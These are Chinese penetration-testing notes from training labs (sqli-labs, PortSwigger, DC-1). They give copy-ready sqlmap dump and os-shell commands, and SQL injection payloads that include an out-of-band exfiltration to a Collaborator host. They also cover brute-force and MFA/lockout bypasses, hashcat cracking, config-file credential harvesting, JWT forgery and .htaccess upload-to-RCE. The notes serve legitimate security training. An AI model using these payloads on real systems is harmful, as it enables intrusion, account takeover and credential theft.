## sqlmap

> 环境备注:笔记里 sqlmap 跑在 Windows(SecurityTools,1.10.7),启动方式是 `python sqlmap.py`;Linux/Kali 直接敲 `sqlmap` 即可。注入点:`http://127.0.0.1:8081/Less-1/?id=1`(sqli-labs Less-1 GET 字符型单引号注入)。

### 全流程:枚举 → 脱库(--batch 免交互,会话续跑)
- **① 枚举所有数据库**: `python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch --dbs` — 5 个库:challenges / information_schema / mysql / performance_schema / security;sqlmap 自动识别 4 种注入类型(boolean-based / error-based EXTRACTVALUE / time-based SLEEP(5) / UNION 3 列) (源:09-03sqlmap)
- **② 枚举指定库的表**: `python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch -D security --tables` — 4 张表:emails / referers / uagents / users (源:09-03sqlmap)
- **③ 脱库(指定表全量 dump)**: `python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch -D security -T users --dump` — 15 条数据,CSV 落盘 `C:\Users\huoyuchen\AppData\Local\sqlmap\output\127.0.0.1\dump\security\users.csv`;重复跑同一目标会 resumed from stored session,不重复探测 (源:09-03sqlmap)
- **④ 尝试拿系统 shell**: `python sqlmap.py -u "http://127.0.0.1:8081/Less-1/?id=1" --batch --os-shell` — 本环境所有 web 根目录都报 "no write privileges",原因是 MySQL 5.7+ `secure_file_priv` 限制(见下),是环境限制不是命令错 (源:09-03sqlmap)

### 关键参数与排错(os-shell 失败排查链)
- **确认是否 DBA(写 shell 前先查权限)**: `--is-dba` — 追加到完整 `-u` 命令末尾跑;返回 "current user is DBA: True" 说明 MySQL 权限没问题,别再怀疑权限 (源:09-03sqlmap)
- **执行任意 SQL 查询(查 secure_file_priv)**: `--sql-query "SELECT @@global.secure_file_priv"` — 追加到完整命令后;返回 ' '(一个空格)= OUTFILE 被禁;secure_file_priv 三态:NULL=完全禁用、''=不限制、路径=仅该目录 (源:09-03sqlmap)
- **指定 web 根目录重试 os-shell**: `--web-root "/var/www/html"` — 根目录指对仍失败时先查 secure_file_priv,别瞎怀疑目录权限 (源:09-03sqlmap)
- **读文件 / 进 SQL shell(不受 secure_file_priv 影响)**: `--file-read` / `--sql-shell` — 待实践项;secure_file_priv 只挡 INTO OUTFILE 写(读文件、UDF 思路也受挡),--file-read 读 /etc/passwd 不受影响 (源:09-03sqlmap)
- **认知:os-shell 成功要三层同时满足**: DBA 权限(FILE 权限)≠ 能写文件;还要 ① 高权限 ② secure_file_priv 不限制(老 MySQL/空值) ③ mysqld 进程用户对 web 目录有写权限 — 典型能成功的场景:老版本 MySQL(5.1 前无此限制)、root 无密码连本机 + /var/www 可写 (源:09-03sqlmap)

## SQL 注入手工 Payload(SQLi-Labs Less-21~25,无工具场景)

### Cookie + Base64 注入(Less-21/22:Payload 先 Base64 编码再放 Cookie)
- **Union 注入明文 Payload(Less-21,`'` + 括号闭合)**: `') UNION SELECT 1,2,database()#` — 明文写好后用在线工具 / Burp Decoder / Python `base64.b64encode()` 编码,再放进 Cookie 的 uname 字段;后端 Base64 解码后拼入 `WHERE username=('明文')` (源:08-03SQLiLabs)
- **编码后的 Cookie 值(可直接替换 uname)**: `Cookie: uname=JykpIFVOSU9OIFNFTEVDVCAxLDIsZGF0YWJhc2UoKSM=` — 就是上面明文的 Base64 结果;"admin" 的 Base64 是 `YWRtaW4=`,看到这种特征值先解码再测注入 (源:08-03SQLiLabs)
- **报错注入明文(updatexml 爆库名)**: `') AND updatexml(1,concat(0x7e,database()),1) AND ('` — 编码后放入 Cookie 触发 (源:08-03SQLiLabs)
- **Less-22 双引号闭合版(Union)**: `" UNION SELECT 1,2,database()#` — 套路与 Less-21 完全一样,只改闭合符号 (源:08-03SQLiLabs)
- **Less-22 报错注入版**: `" AND updatexml(1,concat(0x7e,database()),1) AND "` — 拿 `'` 和 `"` 分别测编码后的响应,报错信息会暴露正确闭合符号 (源:08-03SQLiLabs)

### 注释符被过滤(Less-23:用单引号自闭合,不靠注释)
- **自闭合绕过(替代 `--+` / `#`)**: `?id=1' AND '1'='1` — 末尾 `'` 被 WHERE 自带的 `'` 消费,`'1'='1` 形成完整比较表达式,不需要注释 (源:08-03SQLiLabs)
- **报错注入自闭合版**: `?id=1' AND updatexml(1,concat(0x7e,database()),1) AND '1'='1` (源:08-03SQLiLabs)

### 二次注入(Less-24:注册恶意用户名 → 改密时触发)
- **注册恶意用户名(改 admin 的密码)**: `admin'#` — 注册→登录→修改自己的密码,后端执行 `UPDATE users SET password='新密码' WHERE username='admin'#'`,`#` 注释掉后面 → admin 密码被改;转义只保护"当前这次拼 SQL",数据绕一圈回来不重新转义就是炸弹;每次测试要**重新注册**新恶意用户名 (源:08-03SQLiLabs)
- **二次注入 + 报错注入(改密无回显照样查数据)**: `admin' AND updatexml(1,concat(0x7e,database()),1) AND '` — 注册该用户名后走改密流程,updatexml 在 UPDATE 的 WHERE 处执行,页面爆出库名 (源:08-03SQLiLabs)
- **逐级查表名**: `a' OR updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),1) OR '` (源:08-03SQLiLabs)
- **逐级查字段名**: `a' OR updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)),1) OR '` (源:08-03SQLiLabs)
- **逐级拿数据(admin 密码)**: `a' OR updatexml(1,concat(0x7e,(SELECT password FROM users WHERE username='admin' LIMIT 0,1)),1) OR '` — 每级把子查询结果 concat 进报错函数爆出来 (源:08-03SQLiLabs)
- **Payload 太长被 VARCHAR(N) 截断时的精简版**: `a'/**/OR/**/extractvalue(1,concat(0x7e,database()))/**/OR/**/'` — extractvalue 比 updatexml 短;去空格用 `/**/`;前缀用 `a'` 而不是 `admin'` (源:08-03SQLiLabs)

### AND / OR 关键字过滤(Less-25:PHP preg_replace 删词)
- **双写绕过(最稳方案)**: `?id=1' anANDd updatexml(1,concat(0x7e,database()),1) anANDd '` — 过滤删掉中间的 "and" 后两边字符拼回 "and"(字符串拼接,字符挨着就行) (源:08-03SQLiLabs)
- **`&&` 绕过(必须 URL 编码)**: `?id=1' %26%26 updatexml(1,concat(0x7e,database()),1) %26%26 '` — & 在 URL 里是参数分隔符,必须编码成 %26%26 (源:08-03SQLiLabs)
- **`||` 绕过(URL 编码版)**: `?id=1' %7C%7C updatexml(1,concat(0x7e,database()),1) %7C%7C '` — 完全绕开 and/or 两个词 (源:08-03SQLiLabs)
- **内联注释拆词 `a/**/nd` 不可行(别试)**: `a/**/nd` — PHP preg_replace 在字符串层扫描确实没有连续 and/or 会放行,但 MySQL 词法层把注释当 token 丢弃后 `a`、`nd` 不会粘回成 AND → 两种完全不同的规则,这是所有 WAF 绕过的底层逻辑 (源:08-03SQLiLabs)

## 口令爆破(登录/接口/验证码)

### Burp Intruder 登录爆破(Community 版限速 ~1 req/s)
- **Intruder 爆破登录密码的操作路径**: `POST /login → 右键 Send to Intruder → Positions 清 § 后对密码字段 Add § → Payloads 选 Simple list → Load 字典/Paste 弱口令 → Resource pool 线程 5-10 → Start attack` — Sniper 一次爆一个位置(已知用户名只爆密码);Cluster bomb 双位置遍历(10 用户名 × 100 密码 = 1000 请求);线上授权测试线程要更低 (源:08-09登录脆弱)
- **命中判据(先输错一次做基线)**: 先在浏览器故意输错一次,记住失败响应长什么样(状态码、包长度),去攻击结果里找"不一样"的那条 → Send to Repeater 确认;登录成功通常 302、失败 200,Response Length 也不同 (源:08-09登录脆弱)
- **常见弱口令清单(直接 Paste 用)**: `admin/123456 admin/admin root/root admin/password test/test guest/guest` (源:08-09登录脆弱)
- **用户名枚举(响应差异判定存在)**: 失败文案不同("用户名不存在" vs "密码错误")、响应时间差几十 ms、HTTP 状态码不同 → 先枚举出存在的用户名再爆密码,比盲爆效率高很多 (源:08-09登录脆弱)

### 改密接口爆破(改密 = 登录旁路,防护常缺失)
- **防锁爆破:两次新密码固定成不同值**: 改密 POST 表单(current-password / new-password-1 / new-password-2)里爆破 current-password,两个新密码固定填不一致的 `123` / `abc` — 后端缺陷:只有两次新密码**一致**才触发账号锁定,不一致只报错不锁定 → 无限爆破;username 是隐藏字段且客户端可控,改成目标账号就能测别人的当前密码 (源:08-14改密爆破)
- **命中信号 = 文案差异(官方 grep-match)**: 错误当前密码返回 `Current password is incorrect`;正确当前密码才会走到一致性检查、返回 `New passwords do not match` — 用 grep-match 标记后者即命中;错误文案统一能防泄露(防御侧) (源:08-14改密爆破)
- **踩坑:表单默认两次新密码一致,正好踩中锁定条件**: 直接抓改密包爆,错一次账号就锁死没法继续 — 必须手动把两个新密码改成不同值再爆 (源:08-14改密爆破)
- **方法论:防护的计数粒度 = 突破口**: 按 IP 计数 → 伪造 XFF;按 IP + 成功登录重置计数 → 爆破与正确登录交替刷计数;按账号失败次数 → 让"失败"不算数(本关新密码不一致 / 单请求多凭据) (源:08-14改密爆破)

### 单请求多凭据(JSON 数组绕过锁定计数)
- **登录接口 password 字段改数组,一次带整本字典**: `"password": ["候选1","候选2",...]` — Burp Repeater 把 JSON body 的字符串 password 换成数组(塞满 100 个候选)发一次请求;服务端把 password 当"凭据集合"遍历验证(类型未校验),100 次内部尝试对外只算 1 次失败 → 锁定永不触发;返回 **302** = 命中(响应已带 carlos 会话),Show response in browser 就是目标账号 (源:08-14改密爆破)
- **踩坑:换 IP/UA/Cookie 没用**: 这关锁定按**账号**维度计数(X-Forwarded-For 那套不改变目标账号的失败计数)——攻击面在"请求体里能塞多少凭据",不在请求流;防御侧:服务端强制类型校验(password 必须 string,收到数组直接 400),失败按"密码尝试次数"计数 (源:08-14改密爆破)

### 2FA / 验证码 / 重置码爆破
- **2FA 验证码爆破(mfa-code 0000-9999)**: Burp Intruder 爆 `mfa-code` 参数即可,302 命中 — ⚠️ Burp Community Intruder 限速(~1 req/s),线程拉满没用 → 换 Python 60 并发,2 分钟跑完 10000 次;失败 200 / 成功 302,信号干净 (源:08-13PortSwigger)
- **生成 0000-9999 等宽字典**: `seq -w 0 9999` — -w 等宽补零,输出直接喂爆破 (源:08-13PortSwigger)
- **ffuf 满并发替代 Burp CE Intruder**: `ffuf` — Burp Community 版 Intruder 官方限速时的替代方案;笔记只记了工具思路没留完整命令,用时 `ffuf -h` 补全参数 (源:08-13PortSwigger)
- **验证码绕过四种(从低级到高级)**: ① 验证码不刷新 → Intruder 里把验证码字段**写死**,只换密码字典跑;② 验证码仅前端校验 → 抓包直接**扔掉验证码字段**重放,或控制台改 JS 让它永远返回 true;③ 验证码写在 Cookie → 如 `Set-Cookie: captcha_code=ABCD`,构造请求时 Cookie 和表单填一致的值(AAAA/AAAA),两端都自己控制;④ 四位纯数字 → OCR 识别率高,配合 Python 脚本自动识别后爆破 (源:08-09登录脆弱)
- **密码重置 6 位验证码爆破/缺陷点**: 6 位数字 = 100 万组合,不过期无次数限制 Intruder 几分钟爆完;验证码在响应里返回 → 响应体 `{"code":123456}` 等于白验;POST 里 `phone=别人手机号` 改成自己的 → 重置别人账号但验证码发我手机;重置链接 `/reset?token=xxx` 用完还能再用;安全问答("最喜欢的颜色")答案集合小,可爆破 (源:08-09登录脆弱)

## Hash 破解与加解密

> hashcat 需要 GPU:虚拟机(2GB 内存)GPU 模式报 "Not enough device memory" 跑不动,DC-1 实战是宿主机 Windows + RTX 4060 跑(1 分钟 vs 虚拟机 CPU 8 小时)——慢哈希必须上显卡。

### hashcat(宿主机 GPU 跑,下载走 ghfast.top 镜像)
- **破 Drupal7 密码 hash(-m 7900)**: `hashcat -m 7900 -a 0 admin.hash rockyou.txt` — Drupal7 的 hash 是 `$S$...` 格式,对应模式 7900;DC-1 实战 RTX 4060 约 33,619 H/s,1 分钟出 `admin / 53cr3t`("secret" 的 leetspeak:5=S、3=E) (源:08-15DC1)
- **破 Linux shadow($6$ = sha512crypt,-m 1800)**: `hashcat -m 1800` — DC-1 root 的 hash `$6$rhe3rFqk$...` 用 -m 1800 + 全量 rockyou 跑完 **0 命中**(root 密码不在常见字典,靶机设计如此)——别死磕字典,改走 SUID 提权正解 (源:08-15DC1)
- **MD5 离线破解(-m 0,破 stay-logged-in cookie)**: `hashcat -m 0` — PortSwigger Lab3 偷到 `base64(carlos:md5(密码))` 解码后离线破;hashcat 模式速记:0=MD5、1800=sha512crypt($6$)、7900=Drupal7($S$);字典用 rockyou.txt (源:08-13PortSwigger / 08-15DC1)
- **GPU 过热/驱动踩坑**: RTX 4060 满载 83°C,连续跑第二个任务可能 OpenCL 报错 → 等降温再跑,或 `-d 2` 换核显设备 (源:08-15DC1)

### 凭据提取(挖配置文件 / 连库取 hash)
- **CMS 配置文件挖数据库凭据**: `cat /var/www/html/sites/default/settings.php | grep -iE "database|password|user"` — Drupal 的 settings.php 挖出 `deuser / R0ck3t / drupaldb`;每个 CMS 都有 config 文件(flag1 的提示),先找配置再考虑爆 (源:08-15DC1)
- **连库看表、取 users 表密码 hash**: `mysql -u deuser -p'R0ck3t' drupaldb -e "show tables;"` — ⚠️ `-p'密码'` 必须紧贴无空格:`-p 密码` 中间有空格会被当成数据库名 (源:08-15DC1)
- **hash 里有 $ 防止 bash 变量展开**: `echo '$S$...'` — Drupal7 的 hash 以 `$S$` 开头,$ 会被 bash 当变量展开 → 必须用单引号包起来再存文件/喂 hashcat (源:08-15DC1)

### 算法识别速记(加解密笔记,判定信号为主)
- **弱算法判定(可直接报高危)**: Web 应用用 MD5 存密码、AES-ECB 加密 Cookie(相同明文块 → 相同密文块,可做 Cookie 注入/重放)、1024 位 RSA、DES 56 位 → 都算弱实现;前端 JS 搜 `AES_KEY` / `SECRET` / `privateKey` 找硬编码密钥 (源:加解密)
- **JWT 攻击面速记**: HS256 是对称签名,secret 泄露即可伪造;改 header 为 `{"alg":"none"}` 可伪造任意 JWT;RS256/ES256 是私钥签发公钥验签,别有私钥才是突破口;HMAC-SHA256(secret, base64(header)+"."+base64(payload)) (源:加解密)
- **编码绕 WAF 可复制值**: 双重 URL 编码 `%2527`(解码一次得 `%27` 单引号)、Unicode URL 编码 `%u0027`、SQL 注入用 `%27` 替代单引号、`&` 必须编码成 `%26`;Base64 URL 变体把 `+/` 换 `-_` 且不填充 `=`;HTML 实体混淆 `&#x3c;script&#x3e;` 替代 `<script>`;路径遍历非法 UTF-8 序列 `..%c0%af` (源:加解密)

## 认证绕过技巧

### Stay-logged-in / 记住我 Cookie 伪造与离线破解
- **伪造 stay-logged-in cookie(结构公开可伪造)**: `base64(用户名:md5(密码))` — 记住我 cookie 就是 base64(user:md5(pass)),离线预生成 `base64(carlos:md5(候选词))` 列表导入 Intruder 爆破;Burp 官方做法:Payload processing 管线按 Hash: MD5 → Add prefix(用户名:) → Base64 顺序请求时动态转换,字典可复用;200 命中即登录 (源:08-13PortSwigger)
- **爆破时先删掉自己的 session cookie**: 只留 stay-logged-in,否则服务端优先认 session,全部返回 200、攻击失效;命中判定用业务特征("Update email" 按钮)比状态码稳 (源:08-13PortSwigger)
- **离线破解偷来的 cookie(会话接管是即时收益,明文是长期资产)**: 解码得 `carlos:md5(密码)` → `hashcat -m 0` 离线破(或反查);偷到的 cookie 本身就能登录,破解出明文是"长期资产" (源:08-13PortSwigger)

### 2FA / 密码重置 / MFA 逻辑缺陷
- **2FA verify 参数客户端可控**: GET /login2 改 `verify=carlos` — verify 决定"验证谁的码",改成目标账号触发它的验证码,再爆 mfa-code 即可接管 (源:08-13PortSwigger)
- **密码重置投毒(X-Forwarded-Host 未校验)**: 重置链接域名由 `X-Forwarded-Host` 头拼接 → 加该头指向自己控制的 exploit server,目标点邮件里的重置链接后 `temp-forgot-password-token` 进自己 Access log → 拿 token 改密登录;自己先用合法账号(wiener)跑通合法重置链接、再换 token 参数,比手动拼 URL 稳 (源:08-13PortSwigger)
- **MFA 跳过三招**: ① 输完密码不经过 `/mfa/verify`,直接 URL 跳 `/dashboard`(后端可能没在目标页校验 MFA 状态);② 后端返回 `mfa_verified: false`,前端据此判断 → 抓包把响应改成 true;③ 6 位码无尝试次数限制 → Intruder 直接爆 (源:08-09登录脆弱)
- **密码重置流程攻击点汇总**: 改 POST 里的重置目标(phone/email 字段)把验证码发到自己手机;重置链接 token 用完不失效可二次三次用;6 位码不过期可爆破;安全问答答案可枚举 (源:08-09登录脆弱)

## 文件上传与 getshell（2026-09-18 增补）

### 后缀绕过阶梯（先知道卡在哪一层，再选）

- **后缀黑名单穷举（一次只变一个维度）**: `.php5 .phtml .phar .pht .inc .php7` / 大小写 `.PHP` / 双扩展名 `x.php.jpg` / 尾点尾空格 `x.php.` — 只解决「能不能落盘」 (源:09-18上传)
- **路径穿越（写侧 = 上传请求的 filename）**: 字面 `../` 被清洗时用**编码斜杠** `..%2f`（说明清洗在解码**之前**）；用 `replace("../","")` 只删一遍时用**套娃** `....//` (源:09-18上传)
- **改 GET 请求的文件名无效**: 那只是「取哪个文件」，改不了「文件落在哪」；落盘位置只由 POST 的 `filename` 决定 (源:09-18上传)

### 配置层（`.htaccess` 仅对 Apache；先看响应头 Server）

- **把自造后缀交给 PHP（RCE）**: `AddType application/x-httpd-php .pwnx` — 上传 `filename=".htaccess"` 且 **`Content-Type: text/plain`**；映射的后缀与文件名后缀必须**逐字符一致**（自造后缀避开 `l/1/I/O/0` 形近字符） (源:09-18上传)
- **哨兵（探目标读不读 .htaccess）**: 传一条故意写错的指令进去 → 该目录 **500** = 被读了；无变化 = 没被读，立刻换思路 (源:09-18上传)

## SQL 盲注四代信道与 WAF 编码绕过（2026-09-23 增补）

### 判定信号在哪儿读（四代信道）

- **内容信道（页面关键词）**: Intruder → Settings → **Grep - Match** 清空后只加 `Welcome back`，结果表打勾那行 = 命中 — 不用比 Content-Length (源:09-23SQL盲注)
- **报错信道（状态码）**: Intruder 结果表看 **Status 列**，**500 = 条件为真**，200 = 假 — 比配 Grep 更省事 (源:09-23SQL盲注)
- **延时信道（耗时）**: Intruder → **Resource pool → Maximum concurrent requests = 1**（必须单并发：服务端连接池小的时候，正在 sleep 的请求会把同批请求一起堵住 → 全表都像 10 秒），跑完按 **`Response received`** 列排序，~10000ms 那行 = 命中 (源:09-23SQL盲注)
- **带外信道（Collaborator）**: Generate Collaborator payload → 选中位置右键 **Insert Collaborator payload** → Send → **Poll now**；DNS 记录看 **Description**、HTTP 记录看 **Host 头**；域名**最左一段是数据**，右侧 32 位是唯一子域（信箱号）；lab 只放行默认公共 Collaborator (源:09-23SQL盲注)

### Oracle（盲注三件套 + 出网）

- **定方言一发**: `xyz'||(SELECT '' FROM dual)||'` 不报错 = Oracle（无表查询必须 `from dual`；换成不存在的表名会报错 → 证明输入进了 SQL 解析器） (源:09-23SQL盲注)
- **条件性报错（真 = 500）**: `xyz'||(SELECT CASE WHEN (条件) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'` — 头 `'||` 闭合并拼接、尾 `||'` 让原语句的收尾引号仍有配对；`TO_CHAR` 必须包（`1/0` 是数字，与 `''` 类型不符） (源:09-23SQL盲注)
- **表/用户存在性**: `xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` — **`ROWNUM = 1` 必须有**，子查询返回多行会破坏拼接（拿不到标量） (源:09-23SQL盲注)
- **出网（SQLi × XXE 组合拳）**: `x'+UNION+SELECT+EXTRACTVALUE(xmltype('<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLAB/"> %remote;]>'),'/l')+FROM+dual--` — 域名中段换成子查询即**带数据出网**；URL 编码：空格 `+`、`?` `%3f`、`=` `%3d`、`%` `%25`、`:` `%3a`、`;` `%3b` (源:09-23SQL盲注)

### PostgreSQL（堆叠语句延时盲注）

- **条件延时（取数）**: `x'%3BSELECT CASE WHEN (条件) THEN pg_sleep(10) ELSE pg_sleep(0) END--` — `%3B` 是 `;`（cookie 里分号必须编码）；结尾 `--` 把原语句尾巴连引号一起注掉，所以不用配平引号 (源:09-23SQL盲注)
- **用户存在性（无 WHERE，逐行求值）**: `x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--` — 遍历 users 每行求值，任一行命中就睡 10 秒 (源:09-23SQL盲注)
- **为什么不能用 `AND`**: `pg_sleep()` 返回 **void**，而 `AND` 两边必须是 boolean → `argument of AND must be type boolean, not type void`，**解析期就死**（不是被拦）；`UNION` 又需要回显（盲注没有）。⇒ 无回显且不能用布尔表达式时走 `;` 堆叠，或 `x'||pg_sleep(10)--` 拼接 (源:09-23SQL盲注)
- **逐位取值**: `... CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='§a§') ...` — 括号必须包住**整个谓词**；写成 `((username='administrator' AND SUBSTRING(password,1,1))='a')` 会变 `boolean AND text` + `boolean = text`，解析期报错 → 全程没有任何 10 秒的行 (源:09-23SQL盲注)

### WAF 绕过（编码层差）

- **装 Hackvertor 过 WAF**: Burp → Extensions → BApp Store → 搜 Hackvertor；选中 payload → 右键 **Extensions → Hackvertor → Encode → hex_entities** → 自动包成 `<@hex_entities>…</@hex_entities>`（Repeater 里显示明文，**实际发出的是编码后的**） (源:09-23SQL盲注)
- **数字型注入最干净的判定**: `<storeId>1+1</storeId>` 返回 2 号店数据 = 输入被当 SQL 表达式求值（不用引号、不用报错） (源:09-23SQL盲注)
- **单列多值拼接**: `1 UNION SELECT username || '~' || password FROM users` — 分隔符取**数据里不会出现的字符**（`~` / `char(58)` / `CHR(58)`）；该关原查询只有 1 列，试 2 列会返回 `0 units`（= 它的报错信号） (源:09-23SQL盲注)
